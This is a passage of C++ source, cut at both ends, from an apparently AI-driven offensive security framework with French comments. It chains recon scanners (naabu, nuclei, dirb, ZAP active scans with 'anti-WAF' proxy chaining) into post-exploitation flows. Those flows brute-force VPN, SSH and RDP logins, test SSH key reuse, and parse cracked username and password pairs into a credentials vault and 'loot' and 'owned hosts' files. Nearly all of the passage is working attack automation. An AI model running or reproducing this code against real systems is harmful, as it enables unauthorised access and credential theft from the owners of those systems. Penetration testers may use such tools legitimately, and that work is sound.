            e["snippet"] = txt.substr(0, 8192);
            snmp["evidence"].push_back(e);
        }
    }

    try { std::ofstream(workdir/"snmp_loot.txt") << snmp.dump(2); } catch(...) {}

    // -------- 3) SYSLOG / NETFLOW / TELEMETRY LEAKS : gather hints & secrets --------
    sample_telemetry_artifacts_and_save(workdir, workdir / "log_telemetry_loot.json");

    loginfo("[AI] EDGE: analysis complete. Outputs: dns_zone_loot.txt, snmp_loot.txt, log_telemetry_loot.json");
}

// Wrapper to keep existing call-sites unchanged
static void analyse_postexploit_results_edge(const std::string& baseurl,
                                             const fs::path& workdir)
{
    analyse_postexploit_results_edge_impl(baseurl, workdir);
}


// --------------------------- Orchestrateur NET --------------------------------
static void append_net_flows(const std::string& baseurl,
                             const fs::path& workdir,
                             std::vector<ConfirmationCommand>& plan,
                             nlohmann::json& plan_json)
{
    using nlohmann::json;
    json trig = harvest_net_triggers(baseurl, workdir);
    plan_json["net_triggers"] = trig;

    append_vpn_brute_cmds(baseurl, workdir, trig, plan, plan_json);
    append_ssh_brute_keyreuse_cmds(baseurl, workdir, trig, plan, plan_json);
    append_rdp_enum_brute_cmds(baseurl, workdir, trig, plan, plan_json);
    append_proxy_openrelay_cmds(baseurl, workdir, trig, plan, plan_json);
}

// --------------------------- Consolidation / Sorties --------------------------
static void analyse_postexploit_results_net(const std::string& baseurl,
                                            const fs::path& workdir)
{
    using json=nlohmann::json;
    // 1) VPN
    json vpn = json::object(); vpn["generated_at"]=current_datetime_string(); vpn["success"]=json::array();
    for (auto& f : glob_files(workdir, "FLOW_VPN_BRUTE_")) {
        std::string txt = net_slurp_if_exists(f);
        if (net_to_lower(txt).find("login:")!=std::string::npos && net_to_lower(txt).find("password:")!=std::string::npos) {
            vpn["success"].push_back({{"file",f.filename().string()},{"raw",txt}});
            std::regex re(R"(login:\s*([^\s]+)\s*password:\s*([^\s]+))", std::regex::icase);
            std::smatch m;
            if (std::regex_search(txt, m, re) && m.size()>=3) {
                auto vault = load_creds_vault(workdir);
                vault_add_credential(vault, extract_hostname(baseurl), "vpn", "", m[1].str(), m[2].str(), "hydra");
                try { save_creds_vault(workdir, vault); } catch(...) {}
            }
        }
    }
    for (auto& f : glob_files(workdir, "vpn_")) {
        if (net_ends_with(f.filename().string(), "_note.txt")) {
            vpn["notes"].push_back(f.filename().string());
        }
    }
    try { std::ofstream(workdir/"vpn_access.json")<<vpn.dump(2); } catch(...) {}

    // 2) SSH owned (hydra + key reuse)
    json ssh = json::object(); ssh["generated_at"]=current_datetime_string(); ssh["owned"]=json::array();
    {
        for (auto& f : glob_files(workdir, "ssh_hydra")) {
            std::string txt = net_slurp_if_exists(f);
            if (net_to_lower(txt).find("login:")!=std::string::npos && net_to_lower(txt).find("password:")!=std::string::npos) {
                ssh["owned"].push_back({{"file",f.filename().string()},{"method","hydra"},{"raw",txt}});
            }
        }
    }
    {
        for (auto& f : glob_files(workdir, "ssh_keyreuse_")) {
            std::string txt = net_slurp_if_exists(f);
            bool ok = (net_to_lower(txt).find("permission denied")==std::string::npos);
            ssh["owned"].push_back({{"file",f.filename().string()},{"method","key_reuse"},{"likely_success",ok}});
        }
    }
    try { std::ofstream(workdir/"ssh_owned_hosts.json")<<ssh.dump(2); } catch(...) {}

    // 3) RDP
    json rdp = json::object(); rdp["generated_at"]=current_datetime_string(); rdp["owned"]=json::array();
    for (auto& f : glob_files(workdir, "FLOW_RDP_BRUTE")) {
        std::string txt = net_slurp_if_exists(f);
        bool ok = net_to_lower(txt).find("valid")!=std::string::npos || net_to_lower(txt).find("pwned")!=std::string::npos;
        rdp["owned"].push_back({{"file",f.filename().string()},{"raw_ok",ok}});
    }
    for (auto& f : glob_files(workdir, "rdp_enum_note")) {
        rdp["notes"].push_back(f.filename().string());
    }
    try { std::ofstream(workdir/"rdp_owned_hosts.json")<<rdp.dump(2); } catch(...) {}

    // 4) Proxy loot (open relay evidence)
    json proxy = json::object(); proxy["generated_at"]=current_datetime_string(); proxy["evidence"]=json::array();
    for (auto& f : glob_files(workdir, "FLOW_PROXY_OPENRELAY_")) {
        std::string txt = net_slurp_if_exists(f);
        bool ok = net_to_lower(txt).find(" 200")!=std::string::npos;
        proxy["evidence"].push_back({{"file",f.filename().string()},{"open_relay",ok}});
    }
    try { std::ofstream(workdir/"open_proxy_loot.json")<<proxy.dump(2); } catch(...) {}
}

// Phase 3 : orchestrateur Web post-exploit pour un baseurl + workdir donné
static void run_postexploit_web_phase(const std::string &baseurl,
                                      const fs::path &workdir) {
    using json = nlohmann::json;

    loginfo(std::string(ansi::bold) + "[AI] Phase 3 Web: orchestration post-exploit symbolique sur " +
            baseurl + ansi::reset);

    if (!fs::exists(workdir)) {
        logerr("[AI] Post-exploit Web: workdir inexistant: " + workdir.string());
        return;
    }

    json surfaces = collect_web_postexploit_surfaces(baseurl, workdir);

    std::vector<ConfirmationCommand> plan;
    json plan_json;
    build_web_postexploit_plan(baseurl, workdir, surfaces, plan, plan_json);
    // [PATCH API] Augmente le plan avec les flows API (REST/GraphQL/gRPC/Gateway)
    append_api_flows(baseurl, workdir, plan, plan_json);
    // ... après append_api_flows(...)
    append_net_flows(baseurl, workdir, plan, plan_json);
    append_edge_flows(baseurl, workdir, plan, plan_json);
    append_mail_flows(baseurl, workdir, plan, plan_json); 
    append_db_flows(baseurl, workdir, plan, plan_json);

    fs::path plan_file = workdir / "postexploit_plan_web.json";
    try {
        std::ofstream out(plan_file);
        out << plan_json.dump(2);
        loginfo("[AI] Post-exploit Web: plan ecrit dans " + plan_file.string());
    } catch (...) {
        logerr("[AI] Post-exploit Web: echec ecriture postexploit_plan_web.json");
    }

    if (plan.empty()) {
        loginfo("[AI] Post-exploit Web: aucun flow genere (pas de surfaces exploitables detectees).");
        return;
    }

    std::vector<fs::path> produced_files;
    execute_confirmation_plan(plan, workdir, produced_files);
    analyse_postexploit_results_web(workdir, plan, produced_files);
    // [PATCH API] Consolidation des résultats API + génération des rapports JSON + vault
    analyse_postexploit_results_api(baseurl, workdir);
    // ... après analyse_postexploit_results_api(...)
    analyse_postexploit_results_net(baseurl, workdir);
    analyse_postexploit_results_edge(baseurl, workdir);
    analyse_postexploit_results_mail(baseurl, workdir); 
    analyse_postexploit_results_db(baseurl, workdir);   

    loginfo(std::string(ansi::bold) + "[AI] Phase 3 Web: post-exploit symbolique termine pour " +
            baseurl + ansi::reset);
}


// -----------------------------------------------------------------------------
// Web Recon Chain (Nmap supprimé, zgrab2 intégré correctement)
// Profondeur équivalente pour la partie Web :
//  - naabu : full TCP 1-65535
//  - zgrab2 http : TLS + bannières HTTP complètes
//  - httpx : headers + techno
//  - nuclei : vulnéras HTTP
//  - + dig / waybackurls / whatweb / dirb
// -----------------------------------------------------------------------------
// NOTE: dépend de parse_naabu_ports(...) et run_post_naabu_enrichment(...)
//       ainsi que ensure_zgrab2_blocklist() côté zgrab2.
static bool run_recon_web_chain(const std::string& baseurl,
                                const fs::path& workdir,
                                std::vector<fs::path>& produced_files)
{
    produced_files.clear();

    // host = version "safe" pour les noms de fichiers (example.com, dvga_5013, etc.)
    const std::string host   = extract_hostname(baseurl);

    // netloc = ce qui apparaît dans l’URL (example.com, dvga:5013, etc.)
    const std::string netloc = extract_netloc(baseurl);

    // http / https
    const std::string scheme = (baseurl.rfind("https://", 0) == 0) ? "https" : "http";

    // webroot = ce qui sera passé à dirb/httpx/etc. → utilise netloc (important pour les ports !)
    const std::string webroot = scheme + "://" + netloc + "/";

    auto write_out = [&](const fs::path& outpath, const std::string& content){
        try {
            fs::create_directories(outpath.parent_path());
            std::ofstream f(outpath, std::ios::binary);
            f << content;
            produced_files.push_back(outpath);
        } catch (...) {
            // best-effort
        }
    };

    loginfo(std::string(ansi::sky) + "[RECON] Chain start on " + host + ansi::reset);
    produced_files.clear();


    // ---------- 1) DIG (A/AAAA/NS/MX) ----------
    loginfo(std::string(ansi::sky) + "[RECON] DNS: résolution A/AAAA/NS/MX avec dig..." + ansi::reset);
    {
        std::string so, se, cmd;
#ifdef _WIN32
        cmd =
            "sh -c \"{ "
            "dig +noall +answer A "   + host + " ; "
            "dig +noall +answer AAAA "+ host + " ; "
            "dig +noall +answer NS "  + host + " ; "
            "dig +noall +answer MX "  + host + " ; "
            "} 2>&1\"";
#else
        cmd =
            "{ "
            "dig +noall +answer A "   + host + " ; "
            "dig +noall +answer AAAA "+ host + " ; "
            "dig +noall +answer NS "  + host + " ; "
            "dig +noall +answer MX "  + host + " ; "
            "}";
#endif
        run_command_capture(cmd, so, se, 0, false);
        write_out(workdir / "recon_dig.txt", so + "\n" + se);
    }

    // ---------- 2) Résolution IP ----------
    loginfo(std::string(ansi::sky) + "[RECON] Résolution IP (getent/nslookup, info)..." + ansi::reset);
    {
        std::string so, se;
#ifdef _WIN32
        run_command_capture("nslookup " + host, so, se, 0, false);
#else
        run_command_capture("getent ahosts " + host + " | awk '{print $1}' | sort -u", so, se, 0, false);
#endif
        write_out(workdir / "recon_resolved_ips.txt", so + "\n" + se);
    }

    // ---------- 3) NAABU : scan TCP (profils / tuning) ----------
    loginfo(std::string(ansi::sky) + "[RECON] Scan TCP avec naabu (profils / tuning)..." + ansi::reset);
    fs::path naabu_tcp_file = workdir / "recon_naabu_full_tcp.txt";  // on garde le même nom qu'avant
    {
        std::string so, se;
        std::ostringstream cmd;
        cmd << "naabu"
            << " -host " << host
            << " -no-color"
            << " -silent";

        // -------- Sélection des ports TCP --------
        if (!g_scan_conf.custom_ports.empty()) {
            // L'utilisateur impose l'expression de ports (ex: "80,443,8000-8100,u:53")
            cmd << " -ports " << g_scan_conf.custom_ports;
        }
        else if (!g_scan_conf.naabu_top_ports.empty() &&
                 g_scan_conf.naabu_top_ports != "full") {
            // Exemple: --naabu-top-ports 100 / 1000
            cmd << " -top-ports " << g_scan_conf.naabu_top_ports;
        }
        else if (!g_scan_conf.scan_profile.empty() &&
                 g_scan_conf.scan_profile != "full") {
            // Profils logiques : web, mail, db, infra...
            std::string profile_ports;
            if (g_scan_conf.scan_profile == "web") {
                profile_ports = "80,81,443,8000-8100,8080,8081,8443,9000,9443";
            } else if (g_scan_conf.scan_profile == "mail") {
                profile_ports = "25,110,143,465,587,993,995,2525";
            } else if (g_scan_conf.scan_profile == "db") {
                profile_ports = "1433,1521,3306,5432,50000";
            } else if (g_scan_conf.scan_profile == "infra") {
                profile_ports = "21,22,23,80,443,445,139,3389,8080,8443";
            } else {
                // Profil inconnu => fallback full
                profile_ports = "1-65535";
            }
            cmd << " -p " << profile_ports;
        }
        else {
            // Comportement historique : full TCP 1-65535
            cmd << " -p 1-65535";
        }

        // -------- Tuning rate / retries --------
        if (g_scan_conf.auto_tune) {
            // Auto-tune simple : valeurs raisonnables si l'utilisateur
            // n'a rien spécifié. Tu pourras raffiner plus tard via RTT.
            if (g_scan_conf.naabu_rate <= 0)
                cmd << " -rate 10000";
            if (g_scan_conf.naabu_retries <= 0)
                cmd << " -retries 2";
        }

        if (g_scan_conf.naabu_rate > 0)
            cmd << " -rate " << g_scan_conf.naabu_rate;
        if (g_scan_conf.naabu_retries > 0)
            cmd << " -retries " << g_scan_conf.naabu_retries;

        run_command_capture(cmd.str(), so, se, 0, false);
        write_out(naabu_tcp_file, so + "\n" + se);
    }

    // ---------- 3bis) NAABU : UDP basique optionnel ----------
    if (g_scan_conf.enable_udp) {
        loginfo(std::string(ansi::sky) + "[RECON] Scan UDP (DNS/NTP/SNMP...) avec naabu..." + ansi::reset);
        std::string so, se;
        fs::path naabu_udp_file = workdir / "recon_naabu_udp.txt";

        std::ostringstream cmd;
        cmd << "naabu"
            << " -host " << host
            << " -no-color"
            << " -silent"
            << " -udp"
            // Petits ports UDP classiques : DNS, NTP, SNMP, IKE
            << " -p 53,123,161,500,4500";

        if (g_scan_conf.naabu_rate > 0)
            cmd << " -rate " << g_scan_conf.naabu_rate;
        if (g_scan_conf.naabu_retries > 0)
            cmd << " -retries " << g_scan_conf.naabu_retries;

        run_command_capture(cmd.str(), so, se, 0, false);
        write_out(naabu_udp_file, so + "\n" + se);
    }

    // ---------- 3ter) Enrichissement post-naabu (multi-protocoles) ----------
    {
        // ⚠️ Compat totale avec ton ancien code :
        // on parse TOUJOURS "recon_naabu_full_tcp.txt"
        std::set<int> open_ports = parse_naabu_ports(naabu_tcp_file);
        if (!open_ports.empty()) {
            std::ostringstream msg;
            msg << "[RECON] Post-naabu: ports ouverts détectés (";
            bool first = true;
            for (int p : open_ports) {
                if (!first) msg << ",";
                msg << p;
                first = false;
            }
            msg << ") — enrichment multi-protocoles (zgrab2 + NetExec/Impacket)...";
            loginfo(std::string(ansi::sky) + msg.str() + ansi::reset);

            run_post_naabu_enrichment(host, workdir, open_ports, produced_files);

            // ---------- 3quater) Re-scan ciblé optionnel ----------
            if (g_scan_conf.enable_rescan) {
                loginfo(std::string(ansi::sky)
                        + "[RECON] Naabu: 2e passe ciblée sur les ports déjà ouverts..."
                        + ansi::reset);

                std::string so2, se2;
                fs::path naabu_rescan_file = workdir / "recon_naabu_rescan.txt";

                std::ostringstream ports_expr;
                bool first_p = true;
                for (int p : open_ports) {
                    if (!first_p) ports_expr << ",";
                    ports_expr << p;
                    first_p = false;
                }

                std::ostringstream cmd2;
                cmd2 << "naabu"
                     << " -host " << host
                     << " -no-color"
                     << " -silent"
                     << " -p " << ports_expr.str()
                     << " -rate 5000"
                     << " -retries 3";

                run_command_capture(cmd2.str(), so2, se2, 0, false);
                write_out(naabu_rescan_file, so2 + "\n" + se2);
            }
        } else {
            loginfo(std::string(ansi::sky)
                    + "[RECON] Post-naabu: aucun port ouvert parsé, skip enrichment."
                    + ansi::reset);
        }
    }

    // ---------- 4) zgrab2 HTTP : bannières + TLS ----------
#ifndef _WIN32
    loginfo(std::string(ansi::sky) + "[RECON] Grab HTTP/TLS avec zgrab2 (bannières + certifs)..." + ansi::reset);
    {
        ensure_zgrab2_blocklist();

        std::string so, se;
        fs::path json_out = workdir / "recon_zgrab2_http.json";

        std::ostringstream cmd;
        cmd << "printf '%s\n' " << host
            << " | zgrab2 http"
            << " --use-https"
            << " --port 443"
            << " --max-redirects 10"
            << " --output-file " << quote(json_out.string());

        run_command_capture(cmd.str(), so, se, 0, false);

        write_out(workdir / "recon_zgrab2_http.txt", so + "\n" + se);
        produced_files.push_back(json_out);
    }
#else
    {
        loginfo(std::string(ansi::sky) + "[RECON] zgrab2 HTTP step skipped on Windows." + ansi::reset);
    }
#endif

    // ---------- 5) HTTPX : headers / techno / status ----------
    loginfo(std::string(ansi::sky) + "[RECON] Fingerprinting HTTP avec httpx..." + ansi::reset);
    {
        std::string so, se;

        fs::path httpx_targets = workdir / "recon_httpx_targets.txt";
        try {
            std::ofstream tf(httpx_targets, std::ios::binary);
            tf << webroot << "\n";
        } catch (...) {
            logerr("run_recon_web_chain: failed to write httpx targets file");
        }

        std::ostringstream cmd;
        cmd << "httpx"
            << " -l " << quote(httpx_targets.string())
            << " -title -status-code -content-length -tech-detect"
            << " -server -ct -location"
            << " -no-color"
            << " -silent";

        run_command_capture(cmd.str(), so, se, 0, false);
        write_out(workdir / "recon_httpx.txt", so + "\n" + se);
    }

    // ---------- 6) Nuclei : vulnérabilités HTTP ----------
    loginfo(std::string(ansi::sky) + "[RECON] Scan de vulnérabilités HTTP avec nuclei..." + ansi::reset);
    {
        std::string so, se;
        std::ostringstream cmd;
        cmd << "nuclei"
            << " -u " << quote(webroot)
            << " -silent";

        run_command_capture(cmd.str(), so, se, 0, false);
        write_out(workdir / "recon_nuclei.txt", so + "\n" + se);
    }

    // ---------- 7) waybackurls : URLs historiques ----------
    loginfo(std::string(ansi::sky) + "[RECON] Récupération d’URLs historiques (waybackurls)..." + ansi::reset);
    {
        std::string so, se;
#ifdef _WIN32
        run_command_capture("sh -c \"printf '%s\\n' " + webroot + " | waybackurls | sort -u\"", so, se, 0, false);
#else
        run_command_capture("printf '%s\\n' " + webroot + " | waybackurls | sort -u", so, se, 0, false);
#endif
        write_out(workdir / "recon_waybackurls.txt", so);
    }

    // ---------- 8) WhatWeb : fingerprint agressif ----------
    loginfo(std::string(ansi::sky) + "[RECON] Fingerprinting agressif avec whatweb..." + ansi::reset);
    {
        std::string so, se;
        const fs::path json_log    = workdir / "recon_whatweb.json";
        const fs::path verbose_log = workdir / "recon_whatweb_verbose.log";

        std::string cmd =
            std::string("whatweb -v -a 3")
            + " --log-json="    + quote(json_log.string())
            + " --log-verbose=" + quote(verbose_log.string())
            + " " + webroot;

        run_command_capture(cmd, so, se, 0, false);
        write_out(workdir / "recon_whatweb_stdout.txt", so + "\n" + se);

        if (fs::exists(json_log))    produced_files.push_back(json_log);
        if (fs::exists(verbose_log)) produced_files.push_back(verbose_log);

        if (!fs::exists(json_log) || !fs::exists(verbose_log)) {
            logerr("whatweb semble avoir échoué (voir recon_whatweb_stdout.txt). Vérifier l'installation Ruby/whatweb.");
        }
    }

        // --- WAF / CDN detection (wafw00f) --------------------------------------
    {
        print_header_box("Step X - WAF/CDN detection (wafw00f)");
        std::string so, se;
        std::string waf_cmd = "wafw00f -a '" + baseurl + "'";
        bool ok_waf = run_command_capture(waf_cmd, so, se, 0, false);
        fs::path waf_out = workdir / "recon_wafw00f.txt";
        try {
            std::ofstream ofs(waf_out, std::ios::binary);
            ofs << "# Command: " << waf_cmd << "\n";
            ofs << "# SUCCESS: " << (ok_waf ? "true" : "false") << "\n\n";
            if (!so.empty()) ofs << so << "\n";
            if (!se.empty()) ofs << "\nSTDERR:\n" << se << "\n";
        } catch (...) {}
        produced_files.push_back(waf_out);
    }

    // --- Phase 2 : validation / confirmation automatique --------------------
    run_web_validation_phase(baseurl, workdir, produced_files);

    // ---------- 9) Dirb : bruteforce de répertoires ----------
    loginfo(std::string(ansi::sky) + "[RECON] Bruteforce de répertoires avec dirb..." + ansi::reset);
    {
        fs::path wl1 = "/usr/share/dirb/wordlists/common.txt";
        fs::path wl2 = "/usr/share/wordlists/dirb/common.txt";
        fs::path picked = fs::exists(wl1) ? wl1 : (fs::exists(wl2) ? wl2 : fs::path());

        std::string so, se;
        std::string cmd = "dirb " + webroot;
        if (!picked.empty()) cmd += " " + quote(picked.string());
        cmd += " -r -S -o " + quote((workdir / "recon_dirb_common.txt").string());

        run_command_capture(cmd, so, se, 0, false);
        write_out(workdir / "recon_dirb_stdout.txt", so + "\n" + se);
        produced_files.push_back(workdir / "recon_dirb_common.txt");
    }

    loginfo(std::string(ansi::green) + "[RECON] Chain completed (naabu + zgrab2 + httpx + wafw00f + nuclei + legacy)" + ansi::reset);
    return true;
}

// Résolution binaire katana (./kube/katana prioritaire)
static std::string resolve_katana_bin(const std::string& explicit_path){
    if(!explicit_path.empty()) return explicit_path;
#ifdef _WIN32
    fs::path p1 = g_kube_dir / "katana.exe";
    fs::path p2 = g_kube_dir / "katana";
    if (fs::exists(p1)) return p1.string();
    if (fs::exists(p2)) return p2.string();
    return "katana.exe";
#else
    fs::path p1 = g_kube_dir / "katana";
    if (fs::exists(p1)) return p1.string();
    return "katana";
#endif
}

// URL-encode minimal pour l’API ZAP (espace, #, %, ?, & …)
static std::string url_encode(const std::string& s){
    static const char hex[] = "0123456789ABCDEF";
    std::string o; o.reserve(s.size()*3);
    for(unsigned char c: s){
        if( (c>='A'&&c<='Z') || (c>='a'&&c<='z') || (c>='0'&&c<='9') || c=='-'||c=='_'||c=='.'||c=='~'){
            o.push_back((char)c);
        }else{
            o.push_back('%'); o.push_back(hex[c>>4]); o.push_back(hex[c&15]);
        }
    }
    return o;
}

static bool parse_zap_script_spec(const std::string &spec, ZapScriptSpec &out) {
    // spec attendu: name:type:engine:path
    // Ex: loginFlow:standalone:Zest:/zap/scripts/login_flow.zst
    std::vector<std::string> parts;
    size_t start = 0;
    while (true) {
        size_t pos = spec.find(':', start);
        if (pos == std::string::npos) {
            parts.emplace_back(spec.substr(start));
            break;
        }
        parts.emplace_back(spec.substr(start, pos - start));
        start = pos + 1;
    }
    if (parts.size() < 4) {
        logerr("[ZAP] Invalid --zap-script spec (expected name:type:engine:path): " + spec);
        return false;
    }
    out.name   = parts[0];
    out.type   = parts[1];
    out.engine = parts[2];
    out.file   = parts[3];
    out.standalone = (out.type == "standalone");
    return true;
}

// Exécute Katana et produit un fichier URL (une URL/ligne)
static bool run_katana_to_file(const std::string& katana_bin,
                               const std::string& baseurl,
                               const std::vector<std::string>& user_args,
                               const fs::path& out_file,
                               std::string& so, std::string& se)
{
    std::ostringstream cmd;
    cmd << '"' << katana_bin << '"' << " -u " << '"' << baseurl << '"'
        << " -silent -no-color"; // ⬅️ retiré: -retries 2

    // pass-through intégral (mets-y -proxy http://IP:PORT depuis la CLI)
    for (const auto& a : user_args) cmd << " " << a;

    std::string out, err;
    bool ok = run_command_capture(cmd.str(), out, err, 0, false);
    so = out; se = err;

    try {
        fs::create_directories(out_file.parent_path());
        std::ofstream ofs(out_file);
        ofs << out;
    } catch (...) {}

    if (!ok || (out.empty() && !err.empty())) {
        logerr(std::string("[KATANA] failed: ") + cmd.str() + "\n" + err);
    }
    return ok;
}
// Appelle ZAP /JSON/core/action/accessUrl pour chaque URL (via curl)
static bool zap_access_urls_bulk(const std::string& host, uint16_t port,
                                 const std::string& apikey,
                                 const std::vector<std::string>& urls)
{
#ifndef _WIN32
    for(const auto& u : urls){
        if(u.empty()) continue;
        std::ostringstream curl;
        curl << "curl -sS --max-time 20 "
             << "\"http://" << host << ":" << port
             << "/JSON/core/action/accessUrl/?url=" << url_encode(u)
             << "&followredirects=true";
        if(!apikey.empty()) curl << "&apikey=" << url_encode(apikey);
        curl << "\"";
        std::string so,se;
        run_command_capture(curl.str(), so, se, 30000, false);
        std::this_thread::sleep_for(std::chrono::milliseconds(40)); // évite de saturer ZAP
    }
    return true;
#else
    // Windows: si curl n’est pas dispo, on tente via PowerShell Invoke-WebRequest
    for(const auto& u : urls){
        std::ostringstream ps;
        ps << "powershell -NoLogo -NoProfile -Command "
           << "\"$u='http://" << host << ":" << port
           << "/JSON/core/action/accessUrl/?url=" << url_encode(u)
           << "&followredirects=true";
        if(!apikey.empty()) ps << "&apikey=" << url_encode(apikey);
        ps << "'; try { iwr -UseBasicParsing $u | Out-Null } catch {}\"";
        std::string so,se;
        run_command_capture(ps.str(), so, se, 30000, false);
        std::this_thread::sleep_for(std::chrono::milliseconds(40));
    }
    return true;
#endif
}

// -----------------------------------------------------------------------------
// ZAP JSON API helpers (GET via curl / PowerShell)
// -----------------------------------------------------------------------------
static bool zap_api_json_get(const AgentOptions &opt,
                             const std::string &path_and_query,
                             json &out_j)
{
    std::string so, se;

#ifndef _WIN32
    {
        std::ostringstream cmd;
        cmd << "curl -sS --max-time 30 \"http://" << opt.host << ":" << opt.port
            << path_and_query;
        if (path_and_query.find('?') == std::string::npos) cmd << "?";
        else cmd << "&";
        if (!opt.apikey.empty()) cmd << "apikey=" << url_encode(opt.apikey);
        cmd << "\"";

        if (!run_command_capture(cmd.str(), so, se, 35000, false)) {
            logerr("[ZAP] zap_api_json_get curl failed: " + se);
            return false;
        }
    }
#else
    {
        std::ostringstream ps;
        ps << "powershell -NoLogo -NoProfile -Command "
           << "\"$u='http://" << opt.host << ":" << opt.port
           << path_and_query;
        if (path_and_query.find('?') == std::string::npos) ps << "?";
        else ps << "&";
        if (!opt.apikey.empty()) ps << "apikey=" << url_encode(opt.apikey);
        ps << "'; "
           << "try { (Invoke-WebRequest -UseBasicParsing $u).Content } catch { '' }\"";

        if (!run_command_capture(ps.str(), so, se, 35000, false)) {
            logerr("[ZAP] zap_api_json_get Invoke-WebRequest failed: " + se);
            return false;
        }
    }
#endif

    try {
        out_j = json::parse(so, nullptr, false);
        if (out_j.is_discarded()) {
            logerr("[ZAP] zap_api_json_get: invalid JSON response.");
            return false;
        }
    } catch (const std::exception &ex) {
        logerr(std::string("[ZAP] zap_api_json_get: JSON parse error: ") + ex.what());
        return false;
    }
    return true;
}

// Import d'un .context exporté depuis ZAP (auth, users, regex, etc.)
static bool zap_import_context(const AgentOptions &opt, const std::string &ctx_file)
{
    if (ctx_file.empty()) return true;
    json j;
    std::ostringstream path;
    path << "/JSON/context/action/importContext/?contextFile=" << url_encode(ctx_file);
    if (!zap_api_json_get(opt, path.str(), j)) {
        logerr("[ZAP] Failed to import context file: " + ctx_file);
        return false;
    }
    return true;
}

// Met le contexte in-scope (true/false)
static bool zap_set_context_in_scope(const AgentOptions &opt,
                                     const std::string &ctx_name,
                                     bool in_scope)
{
    if (ctx_name.empty()) return true;
    json j;
    std::ostringstream path;
    path << "/JSON/context/action/setContextInScope/?contextName=" << url_encode(ctx_name)
         << "&inScope=" << (in_scope ? "true" : "false");
    return zap_api_json_get(opt, path.str(), j);
}

// Retourne l'ID du contexte à partir du nom
static int zap_get_context_id(const AgentOptions &opt, const std::string &ctx_name)
{
    if (ctx_name.empty()) return -1;
    json j;
    std::ostringstream path;
    path << "/JSON/context/view/context/?contextName=" << url_encode(ctx_name);
    if (!zap_api_json_get(opt, path.str(), j)) return -1;
    try {
        if (j.contains("context") && j["context"].contains("id")) {
            return std::stoi(j["context"]["id"].get<std::string>());
        }
    } catch (...) {}
    logerr("[ZAP] Failed to resolve context id for: " + ctx_name);
    return -1;
}

// ID de user ZAP à partir du nom (dans un contexte donné)
static int zap_get_user_id(const AgentOptions &opt, int ctx_id, const std::string &user_name)
{
    if (ctx_id < 0 || user_name.empty()) return -1;
    json j;
    std::ostringstream path;
    path << "/JSON/users/view/usersList/?contextId=" << ctx_id;
    if (!zap_api_json_get(opt, path.str(), j)) return -1;
    try {
        if (j.contains("users") && j["users"].is_array()) {
            for (const auto &u : j["users"]) {
                std::string name = u.value("name", "");
                if (name == user_name && u.contains("id")) {
                    return std::stoi(u["id"].get<std::string>());
                }
            }
        }
    } catch (...) {}
    logerr("[ZAP] Failed to resolve user id for user '" + user_name + "' in contextId=" + std::to_string(ctx_id));
    return -1;
}

// Set default User-Agent (morphing simple côté ZAP)
static bool zap_set_default_user_agent(const AgentOptions &opt, const std::string &ua)
{
    if (ua.empty()) return true;
    json j;
    std::ostringstream path;
    path << "/JSON/core/action/setOptionDefaultUserAgent/?String=" << url_encode(ua);
    return zap_api_json_get(opt, path.str(), j);
}

// Proxy chain (anti-WAF basique)
static bool zap_set_proxy_chain(const AgentOptions &opt,
                                const std::string &host,
                                uint16_t port)
{
    if (host.empty() || port == 0) return true;
    json j1,j2,j3;

    std::ostringstream p1;
    p1 << "/JSON/core/action/setOptionProxyChainName/?String=" << url_encode(host);
    zap_api_json_get(opt, p1.str(), j1);

    std::ostringstream p2;
    p2 << "/JSON/core/action/setOptionProxyChainPort/?Integer=" << port;
    zap_api_json_get(opt, p2.str(), j2);

    std::ostringstream p3;
    p3 << "/JSON/core/action/setOptionUseProxyChain/?Boolean=true";
    zap_api_json_get(opt, p3.str(), j3);

    return true;
}

// Chargement / activation de scripts ZAP
static bool zap_load_script(const AgentOptions &opt, const ZapScriptSpec &spec)
{
    json j;
    std::ostringstream path;
    path << "/JSON/script/action/load/?scriptName=" << url_encode(spec.name)
         << "&scriptType=" << url_encode(spec.type)
         << "&scriptEngine=" << url_encode(spec.engine)
         << "&fileName=" << url_encode(spec.file);
    if (!zap_api_json_get(opt, path.str(), j)) {
        logerr("[ZAP] Failed to load script: " + spec.name + " from " + spec.file);
        return false;
    }

    if (!spec.standalone) {
        json j2;
        std::ostringstream p2;
        p2 << "/JSON/script/action/enable/?scriptName=" << url_encode(spec.name);
        zap_api_json_get(opt, p2.str(), j2);
    }
    return true;
}

// Exécution d’un script standalone (souvent: login flow Zest / scénarios business-logic)
static bool zap_run_standalone_script(const AgentOptions &opt, const std::string &name)
{
    if (name.empty()) return true;
    json j;
    std::ostringstream path;
    path << "/JSON/script/action/runStandAloneScript/?scriptName=" << url_encode(name);
    return zap_api_json_get(opt, path.str(), j);
}

// Ajax Spider sur baseurl
static bool zap_ajax_spider(const AgentOptions &opt, const std::string &url)
{
    if (url.empty()) return true;
    json j;
    std::ostringstream path;
    path << "/JSON/ajaxSpider/action/scan/?url=" << url_encode(url)
         << "&recurse=true";
    return zap_api_json_get(opt, path.str(), j);
}

// Spider authentifié pour un user (spiderAsUser)
static bool zap_spider_as_user(const AgentOptions &opt,
                               int context_id, int user_id,
                               const std::string &url)
{
    if (context_id < 0 || user_id < 0 || url.empty()) return false;
    json j;
    std::ostringstream path;
    path << "/JSON/spider/action/scanAsUser/?contextId=" << context_id
         << "&userId=" << user_id
         << "&url=" << url_encode(url);
    if (!zap_api_json_get(opt, path.str(), j)) return false;

    // On attend la fin du spider (status=100)
    std::string scanId = j.value("scan", std::string());
    if (scanId.empty()) return true; // best effort

    int last = -1;
    while (true) {
        json st;
        std::ostringstream ps;
        ps << "/JSON/spider/view/status/?scanId=" << scanId;
        if (!zap_api_json_get(opt, ps.str(), st)) break;
        try {
            int p = std::stoi(st.value("status", std::string("0")));
            if (p != last) {
                render_progress_percent(p);
                last = p;
            }
            if (p >= 100) break;
        } catch (...) { break; }
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    if (last < 100) render_progress_percent(100);
    std::cout << std::endl;
    return true;
}

// Active Scan authentifié (scanAsUser) sur une URL, avec progress bar
static bool zap_ascan_as_user(const AgentOptions &opt,
                              int context_id, int user_id,
                              const std::string &url,
                              const std::string &policyName,
                              int throttle_ms)
{
    if (context_id < 0 || user_id < 0 || url.empty()) return false;
    json j;
    std::ostringstream path;
    path << "/JSON/ascan/action/scanAsUser/?contextId=" << context_id
         << "&userId=" << user_id
         << "&url=" << url_encode(url)
         << "&recurse=true";
    if (!policyName.empty()) {
        path << "&scanPolicyName=" << url_encode(policyName);
    }
    if (!zap_api_json_get(opt, path.str(), j)) {
